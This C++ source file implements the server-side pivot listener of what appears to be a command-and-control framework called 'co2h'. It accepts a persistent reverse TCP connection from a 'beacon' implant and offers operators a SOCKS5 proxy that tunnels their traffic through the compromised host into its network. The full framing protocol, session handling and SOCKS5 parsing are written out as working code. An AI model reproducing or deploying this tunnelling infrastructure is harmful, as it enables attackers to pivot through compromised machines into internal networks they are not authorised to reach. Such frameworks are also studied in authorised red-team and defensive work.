// PivotListener: raw TCP reverse pivot + SOCKS5 frontend.
// Beacon connects on pivot_port; operators use socks_port.
// No HTTP polling: data flows directly over the persistent TCP pipe.

#include "PivotListener.hpp"

#include <co2h/crypto.hpp>
#include <spdlog/spdlog.h>

#include <array>
#include <cstring>

namespace co2h::server::pivot {

// ---- wire constants ------------------------------------------------------
static constexpr std::uint8_t PV_CONNECT      = 0x01;
static constexpr std::uint8_t PV_CONNECT_OK   = 0x02;
static constexpr std::uint8_t PV_CONNECT_FAIL = 0x03;
static constexpr std::uint8_t PV_DATA         = 0x04;
static constexpr std::uint8_t PV_CLOSE        = 0x05;

// ---- helpers -------------------------------------------------------------
static void put_u64(Bytes& b, std::uint64_t v) {
    for (int i = 7; i >= 0; --i) b.push_back(static_cast<std::uint8_t>(v >> (i*8)));
}
static void put_u32(Bytes& b, std::uint32_t v) {
    b.push_back(static_cast<std::uint8_t>(v>>24));
    b.push_back(static_cast<std::uint8_t>(v>>16));
    b.push_back(static_cast<std::uint8_t>(v>> 8));
    b.push_back(static_cast<std::uint8_t>(v));
}
static std::uint64_t rd_u64(const std::uint8_t* p) {
    std::uint64_t v = 0;
    for (int i = 0; i < 8; ++i) v = (v<<8)|p[i];
    return v;
}
static std::uint32_t rd_u32(const std::uint8_t* p) {
    return (std::uint32_t(p[0])<<24)|(p[1]<<16)|(p[2]<<8)|p[3];
}
static std::uint64_t random_id() {
    std::array<std::uint8_t,8> b{};
    co2h::crypto::random_bytes(b.data(), b.size());
    std::uint64_t v = 0;
    for (auto x : b) v = (v<<8)|x;
    return v;
}

// Build a pivot frame: [u8 type][u64 id BE][u32 len BE][payload]
static Bytes make_frame(std::uint8_t type, std::uint64_t id, BytesView pay) {
    Bytes f;
    f.reserve(13 + pay.size());
    f.push_back(type);
    put_u64(f, id);
    put_u32(f, static_cast<std::uint32_t>(pay.size()));
    f.insert(f.end(), pay.begin(), pay.end());
    return f;
}

// =========================================================================
// PivotConn: wraps the raw TCP socket to beacon. Reads frames, dispatches.
// =========================================================================
class PivotConn : public std::enable_shared_from_this<PivotConn> {
public:
    PivotConn(std::weak_ptr<PivotListener> lw, asio::ip::tcp::socket sock)
        : listener_(std::move(lw)), sock_(std::move(sock)) {}

    void start() { read_frame_header(); }

    // Thread-safe write: queues bytes for async_write.
    void write(Bytes data) {
        auto buf = std::make_shared<Bytes>(std::move(data));
        auto self = shared_from_this();
        asio::post(sock_.get_executor(), [this, self, buf]() {
            bool idle = out_q_.empty();
            out_q_.push_back(std::move(*buf));
            if (idle) do_write();
        });
    }

private:
    void read_frame_header() {
        auto self = shared_from_this();
        asio::async_read(sock_, asio::buffer(hdr_),
            [this, self](const std::error_code& ec, std::size_t) {
                if (ec) { on_error(); return; }
                std::uint8_t  type = hdr_[0];
                std::uint64_t id   = rd_u64(hdr_.data() + 1);
                std::uint32_t len  = rd_u32(hdr_.data() + 9);
                if (len == 0) {
                    dispatch(type, id, {});
                    read_frame_header();
                } else {
                    pay_.resize(len);
                    read_frame_payload(type, id);
                }
            });
    }

    void read_frame_payload(std::uint8_t type, std::uint64_t id) {
        auto self = shared_from_this();
        asio::async_read(sock_, asio::buffer(pay_),
            [this, self, type, id](const std::error_code& ec, std::size_t) {
                if (ec) { on_error(); return; }
                dispatch(type, id, {pay_.data(), pay_.size()});
                read_frame_header();
            });
    }

    void dispatch(std::uint8_t type, std::uint64_t id, BytesView pay) {
        auto lp = listener_.lock();
        if (!lp) return;
        switch (type) {
        case PV_CONNECT_OK:   lp->deliver_data(id, {});  break; // empty = OK signal
        case PV_CONNECT_FAIL: lp->deliver_close(id);     break;
        case PV_DATA:
            lp->deliver_data(id, Bytes{pay.begin(), pay.end()});
            break;
        case PV_CLOSE:
            lp->deliver_close(id);
            break;
        }
    }

    void do_write() {
        if (out_q_.empty()) return;
        auto self = shared_from_this();
        auto buf  = std::make_shared<Bytes>(std::move(out_q_.front()));
        out_q_.pop_front();
        asio::async_write(sock_, asio::buffer(*buf),
            [this, self, buf](const std::error_code& ec, std::size_t) {
                if (ec) { on_error(); return; }
                if (!out_q_.empty()) do_write();
            });
    }

    void on_error() {
        std::error_code ec;
        sock_.close(ec);
        if (auto lp = listener_.lock()) lp->on_beacon_disconnect();
    }

    std::weak_ptr<PivotListener> listener_;
    asio::ip::tcp::socket        sock_;
    std::array<std::uint8_t,13>  hdr_{};
    Bytes                        pay_;
    std::deque<Bytes>            out_q_;
};

// =========================================================================
// SocksSession: handles one SOCKS5 client connecting on socks_port.
// =========================================================================
class SocksSession : public std::enable_shared_from_this<SocksSession> {
public:
    SocksSession(std::shared_ptr<PivotListener> lp, asio::ip::tcp::socket sock)
        : listener_(std::move(lp)), sock_(std::move(sock))
        , id_(random_id()) {}

    std::uint64_t id() const { return id_; }

    void start() { read_greeting(); }

    // Called from PivotListener when beacon responds.
    void on_connect_ok() {
        // Send SOCKS5 success to client, then start pumping client data.
        static const std::uint8_t ok[] = {0x05,0x00,0x00,0x01,0,0,0,0,0,0};
        auto buf = std::make_shared<Bytes>(ok, ok+sizeof(ok));
        auto self = shared_from_this();
        asio::async_write(sock_, asio::buffer(*buf),
            [buf, self](const std::error_code& ec, std::size_t) {
                if (!ec) self->read_client_data();
            });
    }

    void on_connect_fail() {
        static const std::uint8_t err[] = {0x05,0x04,0x00,0x01,0,0,0,0,0,0};
        auto buf = std::make_shared<Bytes>(err, err+sizeof(err));
        asio::async_write(sock_, asio::buffer(*buf),
            [buf](const std::error_code&, std::size_t){});
    }

    // Deliver data received from beacon → client.
    void deliver(Bytes data) {
        if (data.empty()) { close(); return; }
        auto buf  = std::make_shared<Bytes>(std::move(data));
        auto self = shared_from_this();
        asio::post(sock_.get_executor(), [this, self, buf]() {
            bool idle = out_q_.empty();
            out_q_.push_back(std::move(*buf));
            if (idle) do_write();
        });
    }

    void close() {
        std::error_code ec;
        sock_.close(ec);
    }

private:
    void read_greeting() {
        auto self = shared_from_this();
        asio::async_read(sock_, asio::buffer(buf_.data(), 2),
            [this, self](const std::error_code& ec, std::size_t) {
                if (ec || buf_[0] != 0x05) return;
                std::size_t nm = buf_[1];
                if (!nm) return;
                asio::async_read(sock_, asio::buffer(buf_.data(), nm),
                    [this, self](const std::error_code& ec2, std::size_t) {
                        if (ec2) return;
                        static const std::uint8_t rep[] = {0x05, 0x00};
                        auto rb = std::make_shared<Bytes>(rep, rep+2);
                        asio::async_write(sock_, asio::buffer(*rb),
                            [this, rb, self](const std::error_code& ec3, std::size_t) {
                                if (!ec3) read_request();
                            });
                    });
            });
    }

    void read_request() {
        auto self = shared_from_this();
        asio::async_read(sock_, asio::buffer(buf_.data(), 4),
            [this, self](const std::error_code& ec, std::size_t) {
                if (ec) return;
                if (buf_[0] != 0x05 || buf_[1] != 0x01) { send_err(0x07); return; }
                std::uint8_t atyp = buf_[3];
                if (atyp == 0x01) {
                    asio::async_read(sock_, asio::buffer(buf_.data(), 6),
                        [this, self](const std::error_code& e, std::size_t) {
                            if (e) return;
                            asio::ip::address_v4::bytes_type ab;
                            ab[0]=buf_[0]; ab[1]=buf_[1];
                            ab[2]=buf_[2]; ab[3]=buf_[3];
                            host_ = asio::ip::address_v4(ab).to_string();
                            port_ = static_cast<std::uint16_t>((buf_[4]<<8)|buf_[5]);
                            queue_connect();
                        });
                } else if (atyp == 0x03) {
                    asio::async_read(sock_, asio::buffer(buf_.data(), 1),
                        [this, self](const std::error_code& e, std::size_t) {
                            if (e) return;
                            std::size_t hlen = buf_[0];
                            asio::async_read(sock_, asio::buffer(buf_.data(), hlen+2),
                                [this, self, hlen](const std::error_code& e2, std::size_t) {
                                    if (e2) return;
                                    host_.assign(
                                        reinterpret_cast<char*>(buf_.data()), hlen);
                                    port_ = static_cast<std::uint16_t>(
                                        (buf_[hlen]<<8)|buf_[hlen+1]);
                                    queue_connect();
                                });
                        });
                } else if (atyp == 0x04) {
                    // IPv6: 16 bytes addr + 2 bytes port
                    asio::async_read(sock_, asio::buffer(buf_.data(), 18),
                        [this, self](const std::error_code& e, std::size_t) {
                            if (e) return;
                            asio::ip::address_v6::bytes_type ab;
                            std::copy(buf_.begin(), buf_.begin() + 16, ab.begin());
                            host_ = asio::ip::address_v6(ab).to_string();
                            port_ = static_cast<std::uint16_t>((buf_[16]<<8)|buf_[17]);
                            queue_connect();
                        });
                } else { send_err(0x08); }
            });
    }

    void queue_connect() {
        listener_->register_session(id_, shared_from_this());
        listener_->send_connect(id_, host_, port_);
        spdlog::info("pivot socks: CONNECT {}:{} id={:#x}", host_, port_, id_);
    }

    void read_client_data() {
        auto self = shared_from_this();
        sock_.async_read_some(asio::buffer(buf_),
            [this, self](const std::error_code& ec, std::size_t n) {
                if (ec) {
                    listener_->send_close(id_);
                    listener_->unregister_session(id_);
                    return;
                }
                if (n > 0)
                    listener_->send_data(id_, {buf_.data(), n});
                read_client_data();
            });
    }

    void send_err(std::uint8_t code) {
        static const std::uint8_t tpl[] = {0x05,0x00,0x00,0x01,0,0,0,0,0,0};
        Bytes rep(tpl, tpl+sizeof(tpl));
        rep[1] = code;
        auto buf = std::make_shared<Bytes>(std::move(rep));
        asio::async_write(sock_, asio::buffer(*buf), [buf](auto,auto){});
    }

    void do_write() {
        if (out_q_.empty()) return;
        auto self = shared_from_this();
        auto buf  = std::make_shared<Bytes>(std::move(out_q_.front()));
        out_q_.pop_front();
        asio::async_write(sock_, asio::buffer(*buf),
            [this, self, buf](const std::error_code& ec, std::size_t) {
                if (ec) { close(); return; }
                if (!out_q_.empty()) do_write();
            });
    }

    std::shared_ptr<PivotListener>  listener_;
    asio::ip::tcp::socket           sock_;
    std::array<std::uint8_t,4096>   buf_{};
    std::string                     host_;
    std::uint16_t                   port_ = 0;
    std::uint64_t                   id_;
    std::deque<Bytes>               out_q_;
};

// =========================================================================
// PivotListener implementation
// =========================================================================

PivotListener::PivotListener(std::shared_ptr<Core> core, PivotConfig cfg)
    : core_(std::move(core)), cfg_(std::move(cfg))
    , pivot_acc_(core_->io()), socks_acc_(core_->io()) {}

std::string PivotListener::bind_addr() const {
    return cfg_.bind_host + ":" + std::to_string(cfg_.socks_port)
         + " (pivot:" + std::to_string(cfg_.pivot_port) + ")";
}

asio::io_context& PivotListener::io() const { return core_->io(); }

void PivotListener::start() {
    auto make_ep = [&](std::uint16_t port) {
        return asio::ip::tcp::endpoint{
            asio::ip::make_address(cfg_.bind_host), port};
    };

    pivot_acc_.open(asio::ip::tcp::v4());
    pivot_acc_.set_option(asio::ip::tcp::acceptor::reuse_address(true));
    pivot_acc_.bind(make_ep(cfg_.pivot_port));
    pivot_acc_.listen();

    socks_acc_.open(asio::ip::tcp::v4());
    socks_acc_.set_option(asio::ip::tcp::acceptor::reuse_address(true));
    socks_acc_.bind(make_ep(cfg_.socks_port));
    socks_acc_.listen();

    spdlog::info("pivot listener '{}' — pivot:{} socks:{}",
                 cfg_.name, cfg_.pivot_port, cfg_.socks_port);
    accept_pivot();
    accept_socks();
}

void PivotListener::stop() {
    std::error_code ec;
    pivot_acc_.close(ec);
    socks_acc_.close(ec);
}

void PivotListener::accept_pivot() {
    auto self = shared_from_this();
    auto sock = std::make_shared<asio::ip::tcp::socket>(core_->io());
    pivot_acc_.async_accept(*sock, [this, self, sock](const std::error_code& ec) {
        if (ec) {
            if (ec != asio::error::operation_aborted)
                spdlog::warn("pivot accept: {}", ec.message());
            return;
        }
        spdlog::info("pivot '{}': beacon connected from {}",
                     cfg_.name,
                     sock->remote_endpoint().address().to_string());
        auto pc = std::make_shared<PivotConn>(weak_from_this(), std::move(*sock));
        on_beacon_connect(pc);
        pc->start();
        accept_pivot(); // accept next (reconnect support)
    });
}

void PivotListener::accept_socks() {
    auto self = shared_from_this();
    auto sock = std::make_shared<asio::ip::tcp::socket>(core_->io());
    socks_acc_.async_accept(*sock, [this, self, sock](const std::error_code& ec) {
        if (ec) {
            if (ec != asio::error::operation_aborted)
                spdlog::warn("pivot socks accept: {}", ec.message());
            return;
        }
        auto sess = std::make_shared<SocksSession>(self, std::move(*sock));
        sess->start();
        accept_socks();
    });
}

void PivotListener::on_beacon_connect(std::shared_ptr<PivotConn> pc) {
    std::lock_guard lk{mu_};
    beacon_conn_ = std::move(pc);
}

void PivotListener::on_beacon_disconnect() {
    spdlog::warn("pivot '{}': beacon disconnected", cfg_.name);
    // Close all pending sessions.
    std::unordered_map<std::uint64_t, std::shared_ptr<SocksSession>> snap;
    {
        std::lock_guard lk{mu_};
        beacon_conn_.reset();
        snap = sessions_;
        sessions_.clear();
    }
    for (auto& [id, s] : snap)
        s->close();
}

// Deliver DATA from beacon → SOCKS client.
// Empty data = CONNECT_OK signal (beacon successfully connected to target).
void PivotListener::deliver_data(std::uint64_t id, Bytes data) {
    std::shared_ptr<SocksSession> sess;
    {
        std::lock_guard lk{mu_};
        auto it = sessions_.find(id);
        if (it == sessions_.end()) return;
        sess = it->second;
    }
    if (!sess) return;
    if (data.empty()) {
        spdlog::info("pivot '{}': CONNECT_OK id={:#x}", cfg_.name, id);
        sess->on_connect_ok();
    } else {
        sess->deliver(std::move(data));
    }
}

void PivotListener::deliver_close(std::uint64_t id) {
    std::shared_ptr<SocksSession> sess;
    {
        std::lock_guard lk{mu_};
        auto it = sessions_.find(id);
        if (it == sessions_.end()) {
            spdlog::warn("pivot '{}': CONNECT_FAIL/CLOSE id={:#x} (no session)", cfg_.name, id);
            return;
        }
        sess = it->second;
        sessions_.erase(it);
    }
    if (sess) {
        spdlog::info("pivot '{}': CONNECT_FAIL/CLOSE id={:#x}", cfg_.name, id);
        sess->on_connect_fail();
        sess->close();
    }
}

void PivotListener::send_connect(std::uint64_t id,
                                  const std::string& host, std::uint16_t port) {
    std::shared_ptr<PivotConn> pc;
    {
        std::lock_guard lk{mu_};
        pc = beacon_conn_;
    }
    if (!pc) return;
    // Payload: [u16 port BE][host utf-8]
    Bytes pay;
    pay.push_back(static_cast<std::uint8_t>(port >> 8));
    pay.push_back(static_cast<std::uint8_t>(port));
    pay.insert(pay.end(), host.begin(), host.end());
    pc->write(make_frame(PV_CONNECT, id, {pay.data(), pay.size()}));
}

void PivotListener::send_data(std::uint64_t id, BytesView data) {
    std::shared_ptr<PivotConn> pc;
    {
        std::lock_guard lk{mu_};
        pc = beacon_conn_;
    }
    if (!pc) return;
    pc->write(make_frame(PV_DATA, id, data));
}

void PivotListener::send_close(std::uint64_t id) {
    std::shared_ptr<PivotConn> pc;
    {
        std::lock_guard lk{mu_};
        pc = beacon_conn_;
    }
    if (pc) pc->write(make_frame(PV_CLOSE, id, {}));
}

void PivotListener::register_session(std::uint64_t id,
                                      std::shared_ptr<SocksSession> s) {
    std::lock_guard lk{mu_};
    sessions_[id] = s;
}

void PivotListener::unregister_session(std::uint64_t id) {
    std::lock_guard lk{mu_};
    sessions_.erase(id);
}

} // namespace co2h::server::pivot
